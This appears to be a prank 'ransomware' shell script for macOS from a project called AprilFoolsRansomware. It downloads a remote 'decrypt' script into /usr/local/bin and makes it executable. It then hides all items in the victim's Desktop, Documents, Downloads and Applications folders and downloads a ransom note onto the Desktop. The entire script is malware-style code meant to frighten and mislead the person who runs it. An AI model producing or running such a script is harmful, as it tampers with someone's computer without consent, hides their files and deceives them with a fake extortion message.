if [ ! -d "/usr/local/bin" ]; then 
  sudo mkdir /usr/local/bin
fi
curl -fsSL "https://raw.githubusercontent.com/ItsFoxDev/AprilFoolsRansomware/main/decrypt.sh" -o /usr/local/bin/decryptfiles
chmod +x /usr/local/bin/decryptfiles
chflags hidden ~/Desktop/*
chflags hidden ~/Documents/*
chflags hidden ~/Downloads/*
chflags hidden /Applications/*
curl -fsSL "https://raw.githubusercontent.com/ItsFoxDev/AprilFoolsRansomware/main/ransommessage.txt" -o ~/Desktop/READ\ ME.txt
